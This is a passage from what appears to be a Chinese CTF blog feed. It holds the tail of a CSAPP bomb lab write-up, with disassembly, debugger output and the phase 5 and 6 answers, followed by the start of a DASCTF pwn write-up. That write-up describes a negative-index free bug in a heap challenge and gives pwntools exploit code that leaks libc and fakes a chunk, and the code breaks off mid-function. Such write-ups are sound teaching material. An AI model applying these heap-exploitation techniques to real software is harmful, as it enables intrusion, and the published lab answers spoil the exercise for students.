class="built_in">rdi</span>,[<span class="built_in">rsp</span>+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:<span class="keyword">call</span>   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:<span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line"><span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"><span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>很显然是一个大循环<br>动调发现有一个类似于代换表的东西，需要在循环中给出索引，然后查表，最后和字符串对比</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x4024B0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;<span class="built_in">array</span>&gt;:<span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x40245e</span>:<span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure><p>应该是取前面的<code>maduiersnfotvbyl</code><br>索引值为[9, 15, 14, 5, 6, 7]<br>取ascii码值和0xf与后等于索引值即可, “yonefg“</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>部分汇编代码如下</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r14</span>,<span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r12d</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">r13</span></span><br><span class="line">   # <span class="built_in">rsp</span> = <span class="built_in">rbp</span> 都指向我们输入的<span class="number">6</span>个数字，通过栈传递参数，返回值存入<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r13</span>+<span class="number">0x0</span>]</span><br><span class="line">   # 输入的第一个数字进入<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;</span><br><span class="line">   # -<span class="number">1</span> 后和<span class="number">5</span>进行比较, 小于等于则跳转，即第一位数字必须小于<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r12d</span>,<span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">r12d</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">je</span>     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line"><span class="symbol">loop1:</span></span><br><span class="line">   # 跳出循环</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">r12d</span></span><br><span class="line">    # 循环中的第二层循环</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">movsxd</span> <span class="built_in">rax</span>,<span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">4</span>]</span><br><span class="line">        # 索引取出数字</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>+<span class="number">0x0</span>],<span class="built_in">eax</span></span><br><span class="line">        # 比较取出的数字是否和第一个数字相同，相同则爆炸</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ebx</span>,<span class="number">0x5</span></span><br><span class="line">        # <span class="built_in">ebx</span> = <span class="number">1</span>-<span class="number">6</span>，比较所有的数字</span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">    # 跳出第二层循环</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r13</span>,<span class="number">0x4</span></span><br><span class="line">    # 动调发现<span class="built_in">r13</span>指向第一个数字，+<span class="number">4</span>后指向第二个数字</span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">    # 循环，退出条件为<span class="built_in">r12d</span> = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loop2:</span></span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">r14</span></span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="number">0x7</span></span><br><span class="line">   # 循环开始</span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">edx</span></span><br><span class="line">    # 数字 = <span class="built_in">edx</span>( <span class="number">0x7</span> - 数字)</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">    # 退出条件：当前数字为<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>loop1中主要是比较六个数字中是否有相同的数字</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="symbol">loop3:</span></span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>]</span><br><span class="line">   # node节点</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   # 循环，一直到<span class="built_in">eax</span>和数字相等</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">2</span>+<span class="number">0x20</span>],<span class="built_in">rdx</span></span><br><span class="line">   # 将node节点存入到栈空间中</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsi</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rsi</span>,<span class="number">0x18</span></span><br><span class="line">   # 一直到<span class="built_in">rsi</span>=<span class="number">0x18</span>，即遍历完全<span class="number">6</span>个数字</span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="number">0x1</span></span><br><span class="line">   # 第一个数字</span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   # 如果小于等于则向上跳</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span> </span><br><span class="line">   # <span class="number">0x6032d0</span> -&gt; <span class="number">0x000000010000014c</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">    # 向上跳</span><br></pre></td></tr></table></figure><p>这一部分也详细写入注释中<br>经过动调发现实现了将输入的数字减去7，并且将对应的node节点都移动到栈中</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rsp</span>+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rbx</span></span><br><span class="line"># start</span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rcx</span>+<span class="number">0x8</span>],<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"># end  遍历六个node</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="number">0x5</span></span><br><span class="line"><span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"># 如果前一个节点大于后一个节点则不会跳转</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">ebp</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x50</span></span><br><span class="line"><span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>对比了node节点中的数据的大小，我们重启程序，查看原生的node节点情况如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:<span class="number">0x000000010000014c</span><span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:<span class="number">0x00000002000000a8</span><span class="number">0x00000000006032f0</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:<span class="number">0x000000030000039c</span><span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:<span class="number">0x00000004000002b3</span><span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:<span class="number">0x00000005000001dd</span><span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:<span class="number">0x00000006000001bb</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>大小顺序为 3 4 5 6 1 2<br>那么变换后是这些，变换前就是 4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/06/15/8TIOF7ofxShwHuX.png" alt=""></p><h2 id="反馈与总结"><a href="#反馈与总结" class="headerlink" title="反馈与总结"></a>反馈与总结</h2><p>  通过这个实验复习了一些汇编的知识，很大收获，之前习惯于看c代码，才发现读汇编的能力是如此之弱</p><ol><li>objdump -d -m 指令格式 ./binary_file &gt; xxx.asm  反汇编出文件</li><li>函数的连续调用的寄存器参数变化，依然是rdi等寄存器传进去</li><li>毅力，自制力和专注力</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-MAY pwn wp</title>
      <link href="2021/06/05/DASCTF-MAY/"/>
      <url>2021/06/05/DASCTF-MAY/</url>
      
        <content type="html"><![CDATA[<p>两道题都比较中规中矩，第二个比第一个还简单，第一个比赛一开始想歪了，做了很jb久，第二个十几分钟就出了</p><h2 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h2><p>一个比较典型的堆菜单题目</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>逆向的话倒是不难，直接看漏洞，首先是free中，一眼看过去发现这不就是uaf么，free的是指针，本应该清空指针和size，却只清空了size</p><p><img src="https://i.loli.net/2021/06/05/1PVwZi3z5eNS98B.png" alt=""></p><p>但是后期调试的时候发现并不是这样的，因为所有的edit和show功能都是根据size来判断的，也就是相当于清空了指针，这个地方并不存在uaf</p><p>然后又仔细一看，发现真正的漏洞其实在这。<br><img src="https://i.loli.net/2021/06/05/5khUEDn8WRHNi1u.png" alt=""></p><p>free的时候没有判断index小于0的情况，也就是说我们可以以bss中的存放堆指针的位置为坐标原点，向之前的地址进行free，突然联想到了之前让输入姓名，可能就是给我们伪造堆地址创造了条件，我们进入gdb来查看他们是如何分布的。</p><p><img src="https://i.loli.net/2021/06/05/lIa76K9eDxZ3fFP.png" alt=""><br>发现这不就在堆指针的上方么，所以很自然的思路就出来了，就是向前free，用之前能够输入的age当做堆指针，指向一个伪造的chunk，这个伪造的chunk可以由我们来构造堆块的size来决定。</p><p>如下部分exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先是先泄露出来libc地址，这个简单，free unsorted bin后再取回来就可以了</span></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>然后是本题的精华<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line"><span class="comment"># free(-3)</span></span><br></pre></td></tr></table></figure></p><p>效果是这样的<br><img src="https://i.loli.net/2021/06/05/1DxdUwI9jASg7kB.png" alt=""></p><p>然后free(-3)，那个伪造的chunk就进入到bin里了</p><p>然后申请回来，改size为0的话可以获得真正uaf的能力，后面就简单了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ticket&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">26007</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillInfo</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;Your name:&quot;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;what do you want to say before take off(wu hu qi fei):&quot;</span>, say)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your age:&quot;</span>, <span class="built_in">str</span>(age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Remarks size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span 